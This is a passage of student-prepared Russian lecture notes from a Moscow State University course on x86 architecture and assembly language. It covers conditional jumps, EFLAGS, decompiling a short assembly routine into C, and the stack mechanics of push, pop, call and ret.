                                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                     Рис. 4.6: Естественный порядок выполнения



В случае естественного порядка выполнения происходит выборка, декодирование,
к текущему значению счетчика команд прибавляется длина команды. В результате
получаем новое число, от которого снова идет выборка и далее как указано выше.
   Влияние на поток выполнения осуществляется с помощью некоторых
дополнительных команд. Если к команде мы добавляем некоторое условие, то
изменение естественного порядка выполнения программы осуществляется по схеме,
представленной на рис. 4.7.




                                  Рис. 4.7: Изменение порядка выполнения программы

   Вначале выполняется некоторое преобразование над величинами (сложение,
вычитание и др.). После этого содержимое регистра EFLAGS обновляется. Специальная
команда может посмотреть состояния разрядов в EFLAGS. В зависимости от того, что
там выставлено, можно воздействовать на счетчик команд, тем самым перепрыгнуть
куда-то в другое место, избежав естественного хода выполнения.
   Рассмотрим некоторые другие преобразования (дополнительно к тем, что мы
рассмотрели на прошлой лекции). Рассмотрим команды CMP и TEST. Отметим, что
двухадресные команды могут быть неудобны, если операндов два (вычисленное знание
разрушает первый операнд и переопределяет его). Если мы хотим поставить условие,


                                                        47
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




которое сравнивает значения операндов, то такие команды неприменимы. В подобных
случаях можно воспользоваться командой CMP. Эта команда аналогична SUB, но без
перезаписи результата. ТАким образом, условно данную команду можно записать в виде

                                   𝐸 𝐹 𝐿 𝐴𝐺𝑆 ←− (ОП1 - ОП2)

   Команда TEST аналогична команде AND. Допустимые типы операндов для указанных
команд описаны ниже.

   Рассмотрим команды переходов. Переходы бывают

   • безусловные/условные

   • абсолютные/относительные

   Команда JMP – безусловный переход, который отрабатывает всегда. Если речь идет
про регистр или память, то это безусловный абсолютный переход и фактически в EAP
записывается значение операнда. В случае операнда-константы происходит безусловный
относительный переход:
                                𝐸 𝐼 𝑃 ←− (𝐸 𝐼 𝑃 + ОП)

В случае с условным переходом всегда может быть только некоторое 32-разрядное число,
с помощью которого задается цель перехода.
    Команда jcc – прыжок с условием.
    Отметим, что для команд jmp и jcc метка в машинном коде будет представлена 32-
разрядным числом, закодированным прямо в теле команды. Какое это будет конкретное
число, посчитает ассемблер (при трансляции текстового представления в машинный
код программа ассемблер знает, какой будет длина кодировок, поэтому он может
определить, какое число должно быть записано в двоичном коде вместо метки). При
этом, так как полученное число 32-разрядное, мы можем, находясь в любом месте
памяти, перепрыгнуть относительным переходом на любое другое место потенциально
адресуемой памяти, потому что тем самым задается 32-разрядное смещение.
    Таким образом, осуществление естественного порядка выполнения программы может
осуществляться с помощью команд

   • Арифметические операции

   • CMP

            – r/m 8/16/32, i 8/16/32
            – r/m 8/16/32, r 8/16/32
            – r 8/16/32, r/m 8/16/32



                                             48
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                            КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                  СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • TEST

            – r/m 8/16/32, i 8/16/32
            – r/m 8/16/32, r 8/16/32

   • Переходы

            – Способ адресации: задается абсолютный или относительный адрес передачи
              управления
            – Условия выполнения: безусловная или условная передача управления

   • Безусловная передача управления JMP

            – r/m/i 32

   • Условная передача управления Jcc

            – i 32


Коды
   Коды связаны с некоторой комбинацией взведенных или сброшенных разрядов в
EFLAGS. Так, для команды jcc можно записать
                                                    𝑧
                                             [𝑁]
                                                    𝐸
   Здесь подразумевается, что z и E – взаимозаменяемы (z–результат равен нулю
эквивалентно E – операнды равны).
   Рассмотрим условную команду перехода на метку вида

                                            𝑗 𝑧 𝑙𝑎𝑏𝑒𝑙

   Она будет передать управление на помеченное вычисление в коде, тогда, когда раньше
при вычислениях был взведен флаг ZF.
   Аналогично со всеми остальными флагами. Например

                                       [𝑁] {𝑃, 𝑍, 𝑆, 𝐶, 𝑃}

    Здесь в фигурных скобках указаны первые буквы названий флага, один из которых
можно указать, чтобы прыгать к метке в том случае, когда указанных флаг взведён (при
условии отсутствия буквы N перед указанием флага). Если же помимо флага указать N,
то передвижение к метке будет осуществляться только когда указанный флаг сброшен.




                                               49
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Варианты сравнения
   В случае беззнаковых величин кода будут следующие:

                                           𝐴
                                     [𝑁]     [𝐸]
                                           𝐵
Здесь А и В – основные буквы (above и below), Е – опционально добавляется к основной
букве. Например, если написать AE, то код условия означает, что при сравнении двух
операндов ОП1vsОП2 первый будет больше или равен, чем второй. Если Е отсутствует,
мы имеем дело со строгим сравнением.
   В случае знакового сравнения:
                                          𝐺
                                     [𝑁]     [𝐸]
                                          𝐿
   Пример.
Реализуем функцию вида:
                                  𝑓 (𝑥) = 𝑠𝑖𝑔𝑛(𝑥)𝑥 2                            (4.1)

Запишем соответствующий код, разместив итоговый результат в регистре EAX. Для
начала нужно получить величину, с которой мы будем работать:
GET_DEC 4, ECX
   Чтобы не потерять первоначальное значение величины после умножения на себя,
скопируем рассматриваемую величину в EAX:
MOV EAX , ECX
Получаем квадрат:
IMUL EAX . EAX
Получим знак исходной величины:
CMP ECX ,0
Воспользуемся командой условного перехода. Если ECX больше или равен второму
операнду, то есть 0, то мы перепрыгиваем на метку:
jge . end
   NEG EAX
. end :
   Система команд избыточна и позволяет добиваться результата, используя разные
последовательности команд. За счет комбинирования этих последовательностей и выбора
одного способа из многих можно достичь улучшения производительности. Поэтому
предыдущий пример можно было осуществить с помощью команды TEST. Вместо
команд CMP ECX,0; jge .end можно записать



                                           50
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




TEST ECX , ECX
jNs . end


Регистр EFLAGS и инструкции
   Подведем итоги. На рис. 4.8 представлены команды и основные флаги. Команды
сложения, вычитания и обращения знака при своим выполнении меняют всю линейку
арифметических флагов. Аналогично для команд CMP и TEST с единственным отличием
– TEST всегда будет выставлять CF в ноль, так как при поразрядных операциях над
битовыми векторами мы гарантированно не получаем перенос за разрядную сетку.




                                  Рис. 4.8: Регистр EFLAGS и инструкции

    Обозначения в таблице:
«M» инструкция обновляет флаг (сбрасывает или устанавливает)
«–» влияние инструкции на флаг не определено
« » инструкция на флаг не влияет
«0» инструкция сбрасывает флаг

   Отметим, что инструкция может не оказывать никакого влияния на флаг. Это
команды пересылки (как просто пересылки, так и с расширением).Также возможна
ситуация неопределенного поведения – команда отрабатывает, после чего она может
занулить выставить какой-то флаг.



Обратная задача
   Рассмотрим так называемую обратную задачу. Пусть есть некоторый исполняемый
код и пусть нужно представить его в виде языка более высоко уровня (то есть нужно
пройти этапы компиляции в обратную сторону).



                                                   51
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Пример.
Рассмотрим следующий код.
...
SECTION . text
GLOBAL CMAIN
CMAIN :
    MOV EAX , DWORD [a]                ;   (1)
    TEST EAX , EAX                     ;   (2)
    JE .1                              ;   (3)
    MOV ECX , DWORD [b]                ;   (4)
    TEST ECX , ECX                     ;   (5)
    JE .1                              ;   (6)
    CDQ                                ;   (7)
    IDIV ECX                           ;   (8)
    SUB DWORD [a], EDX                 ;   (9)
.1:
    XOR EAX , EAX                      ; (10)
    RET                                ; (11)
   Напишем Си-код, который в сущности будет выполнять то же, что написано выше.
Вариантов записи может быть несколько. Восстановим один из них.
   Заметим, что в указанном коде обращение идет к двум абсолютным адресам памяти,
скрытых от нас метками. Соответственно,где-то в Си-коде были объявлены
static                            a;
static                            b;
Тип данных однозначно определить нельзя. Однако, нам известно, что во всех случаях
обращения к адресам из памяти извлекалось 4 байта. Соответственно, это может быть
тип int (аналогично можно записать long, это не будет ошибкой):
static             int a;
static             int b;
   Чтобы понять, знаковые величины или беззнаковые, нужно рассматривать коды
операции, которые будут использоваться при работе с этими величинами.
   Далее восстанавливается граф потока управления. В данном случае мы имеем дело
с командами, у которых есть естественный ход выполнения и некоторые ситуации
перепрыгивания из одного места в другое. Поэтому можно данную последовательность
команд нарезать таким образом, чтобы получились блоки, связанные некоторыми дугами,
передающими управление из одного блока в другой. Все, что находится внутри такого
блока, гарантированно выполняется последовательно. Нарезка идет в зависимости от
того, какую команду мы видим (передача управления или всё остальное) и от того, куда


                                                 52
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                               КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




мы можем перепрыгнуть. Например, может быть последовательность команд, которые
всегда будут выполняться друг за другом, но они могут рваться меткой, вследствие чего
можно извне попасть в центр данной последовательности. Обычно команды нарезаются
в виде некоторых блоков, из которых составляется граф.
    В данном случае первая, вторая и третья команды выполняются последовательно и
образуют один блок. Третья команда может пойти дальше в четвертую или передать
управление другой команде. Четвертая, пятая и шестая команды образуют еще один блок.
Седьмая, восьмая и девятая команды образуют третий блок, а десятая и одиннадцатая –
четвертый блок. Дополним места ветвления. В результате получим граф, изображенный
на рис. 4.9.

                                                   1
                                                   2
                                            𝑎! = 0 3     𝑎 == 0


                                                  4
                                            𝑏! = 0     𝑏 == 0
                                                  5
                                    𝑎 = 𝑎 − (𝑎%𝑏) 6


                                                   7
                                                   8
                                                   9 управления
                                  Рис. 4.9: Граф потока

   Таким образом, в первой команде мы переслали в EAX a. Далее, если условие Е
                                            10
выполняется, то мы идем на метку .1 (данное условие равносильно 𝑎 == 0). Естественный
                                            11
ход выполнения продолжается в случае 𝑎! = 0. Для команд 4-6 аналогично получаем, что
в ECX переслали b. Далее, идем на метку, если 𝑏 == 0 или продолжаем естественный ход,
если 𝑏! = 0. Далее происходит деление. При этом, анализируя оставшийся код, можно
сказать, что мы пользуемся результатом взятия остатка. Таким образом, в восьмой строке
вычисляется выражение 𝑎%𝑏. В девятой строке полученное выражение вычитается из
переменной а.
   Запишем Си-код:
if(a\ neq 0)
    if(b\ neq 0)
         a -=( a%b);
   Заметим, что возможна и более короткая запись:
if(a &&b)
     a -=( a%b);



                                                53
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Просмотр содержимого исполняемого файла
   Рассмотрим дизассемблированный листинг, который относится к полностью
собранной исполняемой программе:
-bash -2.05 b$ ./ build_asm .sh backward .asm
-bash -2.05 b$ objdump -d -M intel backward
./build_asm.sh – собираем код, objdump -d -M intel backward – дизассмблируем и переводим
двоичную запись c использованием синтаксиса Intel. В результате получаем
080483 e0 <main >:
80483 e0: a1 fc 94 04 08                mov        eax ,ds :0 x80494fc
80483 e5: 85 c0                         test       eax , eax
80483 e7: 74 13                         je         80483 fc <main .1 >
80483 e9: 8b 0d 00 95 04 08             mov        ecx ,ds :0 x8049500
80483 ef: 85 c9                         test       ecx , ecx
80483 f1: 74 09                         je         80483 fc <main .1 >
80483 f3: 99                            cdq
80483 f4: f7 f9                         idiv       ecx
80483 f6: 29 15 fc 94 04 08             sub        ds :0 x80494fc , edx
080483 fc <main .1 >:
80483 fc: 31 c0                         xor        eax , eax
80483 fe: c3                            ret
80483 ff: 90                            nop
   Вместо имен переменных у нас появились абсолютные значения адресов. Здесь можно
четко проследить, в каком порядке и на каком расстоянии друг от друга размещены
переменные. Вначале идет переменная a, сразу после нее без промежутка – переменная b.
Третья и шестая строки имеют передачу управления.




                                          54
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 5. Вызов функции
Вызов функции
   Определим, что необходимо для вызова функции и выхода из неё. Определим, что
необходимо для вызова фукнции и выхода из неё.

   • Вопросы

            – Передача управления и возвращение обратно
            – Вычисление значений фактических параметров и их размещение
            – Передача возвращаемого значения
            – Размещение автоматических локальных переменных
            – Порядок использование регистрового файла различными функциями
            – Какие именно машинные команды использовать для поддержки функций

   • Ответы – Application Binary Interface (ABI)

            – Соглашение о вызовах (Calling Convention)

    Рассмотрим каждый пункт отдельно. Сперва нужно передать управление на участок
кода, где будут находиться команды, относящиеся к другой функции. После того, как
функция отработана, необходимо вернуться обратно. Значит, нужно запоминать адрес
возврата.
    Следующий вопрос – параметры. Пусть над данными выполняются некоторые
типовые действия. Эти данные нужно как-то передавать. В языке Си передача параметров
происходит по значениям. Возникает вопрос, как именно нужно передавать. В случае
нашей машины регистров немного и мы не будем ими пользоваться для решения данной
задачи.
    Аналогичный вопрос возникает и для возвращаемого значения. Функция может
возвращать как примитивные типы данных, так и что-то производное. Если речь идет о
целых числах или указателе, может хватить и регистра, но если возвращается структура,
то возникает проблема, так как структура может занимать произвольное число байт.
    Для автоматических локальных переменных вопрос решается примерно следующим
образом. Где-то в памяти выделяется какое-то место. Туда располагаем один из регистров
и далее смещаемся от этого места.
    Следующий вопрос связан с регистрами. Всего регистров восемь, в свободном
распоряжении ещё меньше. Если где-то вокруг вызова функции идет вычисление
каких-то выражений, то снова нужно задать некоторые правила, чтобы не возникало
коллизий (не должно быть так, что где-то снаружи функции используется регистр, а
потом вызванная функция тоже захотела его использовать).


                                            55
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




    Сборник ответов на эти вопросы – один из разделов документа Application Binary
Interface (ABI). Этот документ формируется для каждой аппаратной платформы, то есть
для каждого процессора и для той операционной системы, которая на ней работает. При
этом даже на одной и той же процессорной архитектуре но в разных операционной
системах этот документ может отличаться. Помимо правил, описывающих работу
соглашения вызова, в ABI есть различные требования по размещению данных в памяти
в части выравнивания, то, в каких форматах следует хранить код и так далее.


Аппаратный стек AI-32
   • Область памяти, работа с которой ведется согласно дисциплине стека

   • Стек растет в направлении меньших адресов

   • Регистр esp содержит адрес «верхушки» стека (наименьший адрес памяти)

   В той архитектуре, с которой мы работаем, есть некоторая особенность –
аппаратная поддержка стека. Есть специализированные команды и специализированное
использование определённого регистра, что позволяет удобно работать со стеком. До
этого память мы рисовали как одномерный массив. В случае со стеком эту область
памяти лучше представлять другим образом. Естественное представление стека – стопка
4-байтных двойных слов, которые уложены друг на друга. Есть некая область памяти,
которую операционная система обозначила как доступную для чтения и записи. Куда-то
внутрь этой памяти указывает регистр ESP. Этот регистр мы воспринимаем как указатель
на верхушку стека. Помещать на стек можно размыве величины, причем укладываются
туда и снимаются оттуда они порциями или в два, или в четыре байта. Мы будем
рассматривать случай, когда эта порция – четыре байта и адреса выровнены и кратны
четырём.


Команда push
   Рассмотрим команду push, которая что-то кладет на верхушку стека. У нее может
быть операндом или регистр или памяти. Или же можно использовать непосредственно
закодированную величину в соответствии с написанным ниже:
                                                  8
                                               16 16
                                    𝑝𝑢𝑠ℎ 𝑟/𝑚     𝑖/
                                               32 32
   Стек растет вниз (рис. 24.10), а адреса увеличиваются снизу вверх. Это означает, что
каждый раз, когда мы что-то помещаем командой push, помещаемое значение каждый раз
будет находиться все ближе к нулевому адресу.




                                          56
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                     Рис. 5.1: Стек.


   Рассмотрим, как конкретно происходит размещение в стек. Отметим, что размещение
может быть в памяти, значит, может использоваться косвенная адресация, то есть для
определения исполнительного адреса можно использовать какие-то регистры.
   Рассмотрим следующий псевдокод. Берем операнд и запоминаем его значение:

                                      𝑡𝑚 𝑝 ← ОП

Уменьшаем ESP на размер того, что в не помещаем:

                                    𝐸 𝑆𝑃 ← 𝐸 𝑆𝑃 − 4

По этому уменьшенному адресу помещаем запомненное значение:

                                     [𝐸 𝑆𝑃] ← 𝑡𝑚 𝑝

   Рассмотрим команду
push dword [ ESP ]
   Перед запуском программы была
выделена память, на верхний адрес
операционная система установила ESP,
чтобы было сформировано дно стека.
Пусть команда начинает выполняться,
ESP показывает на некоторый адрес.
Копируем то, что было по этому адресу,
и переносим по адресу, сдвинутому на 4.
Путем использования последовательности
таких команд можно расклонировать по
стеку какую-то величину (рис. 5.2).        Рис. 5.2: Иллюстрация к объяснению
   Отметим, что при работе с указанной командой получается, что можно работать с


                                           57
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                            КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                  СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




памятью дважды – и на чтение, и на запись. Это происходит за счет того, что память не
произвольно адресуемая, а в первом и втором случае для адресации того, с чем работаем,
всегда используем регистр ESP, то есть не нужно дополнительно кодировать адреса.


Команда pop
   Команда pop отвечает за выгрузку данных из стека. Эта команда работает или с
регистром или с памятью соответствующих размеров:

                                                    16
                                              𝑟/𝑚
                                                    32
    Рассмотрим работу команды. Запоминаем величину, на которую указывает ESP
(указатель верхушки стека):
                                  𝑡𝑚 𝑝 ← ОП

После чего увеличиваем ESP на 4:

                                          𝐸 𝑆𝑃 ← 𝐸 𝑆𝑃 + 4

Отправляем в операнд запомненное выражение:

                                            ОП ← 𝑡𝑚 𝑝

   Рассмотрим команду
pop dword [ ESP ]
Эта команда будет выполнять аналогичные действия, но в обратном направлении.




                                  Рис. 5.3: Выполнение команды pop

   При этом, данные, которые находились ниже верхушки стека, остаются там
неизменными. При этом с логической точки зрения они перестают для нас существовать.



                                                58
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Все, что находится ниже верхушки стека, с логической точки зрения это некоторая
свободная память.
   Посмотрим, что будет делать команда
pop esp
esp – формально регистр общего назначения. Мы можем взять что-то со стека,
переместить это значение в esp. Тогда указатель перескочит в другое место – мы
продолжим работать с другой областью памяти. Которая будет рассматриваться машиной
как стек. Мы сами должны озаботиться тем, чтобы с этой памятью можно было работать.



Языки программирования (ЯП), базирующиеся на стеке вызовов
   Языки программирования (ЯП), базирующиеся на стеке вызовов:

   • ЯП с поддержкой рекурсии

            – С, Pascal, Java, …
            – Код функции можно вызывать повторно (“Reentrant”)

                      * Одновременно могут выполняться несколько вызовов функции
            – Необходимо выделять память под сохранение состояния каждого работающего
              вызова

                      * Аргументы
                      * Локальные переменные
                      * Адрес возврата
   • Стек

            – Сохранять состояние вызова функции надо в ограниченный период времени:
              от момента вызова до момент выхода
            – Вызываемая функция всегда завершается до вызывающей

   • Стек выделяется Фреймами

            – Состояние отдельного вызова функции

   На стеке мы будем выделять области памяти, в которых будет размещаться вся
необходимая служебная информация, для того, чтобы мог выполняться очередной
вызов функции. Так или иначе стек требуется для любого языка программирования,
поддерживающего рекурсию.
   Под каждый вызов функции на стеке выделяется некоторый блок – фрейм. С этим
фреймом мы работает до тех пор, пока идет выполнение очередного вызова. Вызовы


                                                59
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




функции по времени строго вложены друг в друга – до тех пор, пока очередной вызов
не отработал, мы не возвращаемся в вызывающую функцию. Поэтому фреймы можно
распределять на стеке.



Порядок вызова функции
   Вернемся к проблеме возвращения из функции. Для решения данной проблемы есть
команды call и ret. Порядок вызова функции:

   • Аппаратный стек используется для вызова функций и возврата из них

   • Вызов функции: call label

            – На стек помещается адрес возврата
            – Выполняется прыжок на метку label

   • Адрес возврата:

            – Адрес инструкции непосредственно расположенной за инструкцией call
                  804854 e:       e8 3d 06 00 00         call 8048 b90 <main >
                  8048553:        50                     push eax

            – Адрес возврата = 0x8048553

   • Возврат из функции: ret

            – Выгрузка адреса из стека
            – Прыжок на этот адрес

   Рассмотрим эти команды подробнее. Команда call переедает управление и запоминает
место, в которое нужно будет вернуться, чтобы продолжить работу (то есть она
запоминает адрес следующей команды и кладет его на стек). Если записать, в каком виде
она будет работать, получим:
call rel32
Здесь rel32 указывает на то, что речь идет о константе, которая будет восприниматься как
относительный адрес.
Другая форма (в качестве операнда можно использовать регистр или память):
call r/m 32




                                            60
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Здесь будут абсолютные адреса.
   При этом происходит следующее. Определяется, куда мы прыгнем:

                                    𝑡𝑚 𝑝𝐷𝑒𝑠𝑡 ←− 𝐷𝑒𝑠𝑡

Здесь Dest – исполнительный адрес, на который мы будем переходить. После этого берем
текущее значение счетчика команд и кладем его на стек:

                                          𝑝𝑢𝑠ℎ(𝐸 𝐼 𝑃)

После этого пересылаем запомненное значение в EIP (то есть осуществляем передачу
управления).
                               𝐸 𝐼 𝑃 ←− 𝑡𝑚 𝑝𝐷𝑒𝑠𝑡

   Рассмотрим команду ret. У нее нет операндов. Она берет то, что находится на текущей
верхушке стека и отправляет в EIP:

                                    𝑅𝑒𝑡    𝐸 𝐼 𝑃 ←− 𝑝𝑜 𝑝

   Тем самым можно вернуться на ту же самую команду, которая разродилась после
вызова call. При этом в каждом вызове адрес на верхушке стека может быть разный.
   Рассмотрим следующую иллюстрацию с модельным стеком (рис. 5.4). Будем считать,
что esp указывает на 108. После того, как выполнили call, адрес следующей команды
появился внизу, под величиной 123, которая далее будет интерпретироваться как аргумент
вызова. esp уменьшился на 4 и eip стал стал тем, на что мы передаем управление.




                                  Рис. 5.4: Вызов функции

   Внутри вызова функции может происходить все, что угодно. Мы можем сдвигать
верхушку стека вниз, помещать туда что-то, работать со фреймом и прочее. Но, когда
мы хотим вернуться из функции, нужно вернуть esp на то же самое место, где был


                                              61
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                               КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




запомненный адрес возврата. В противном случае при вызове ret можно перепрыгнуть
в непредсказуемое место.




                                     Рис. 5.5: Выход из функции

   Указанный механизм позволяет отрабатывать сложные ситуации, в том числе
рекурсии. Рассмотрим пример цепочки вызовов (рис. 5.6). Здесь есть три функции,
которые вызывают друг друга. Граф вызовов указанна рис. 5.7. Переходя по этому графу,
и правильно возвращаясь, мы будем описывать некоторое дерево вызовов. Например,
дерево вызовов может быть таким, как на рис. 5.6 справа.




                                  Рис. 5.6: Пример цепочки вызовов



                                       yoo     who      amI


                                       Рис. 5.7: Граф вызовов



Стек фреймов
   Во фрейме, помимо адреса возврата мы будем держать локальные переменные,
какие-то временные переменные. Управлять такими фреймами будет некоторый


                                                62
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




вспомогательный код, который не относится напрямую к логике программы. То есть, у
нас есть тело функции, в котором мы реализуем нужные алгоритмы, но они обрамляются
прологом и эпилогом. То есть, в тот момент, когда произошла передача управления и
мы начали работать с функцией, отрабатывает пролог – кусок текста, который фрейм
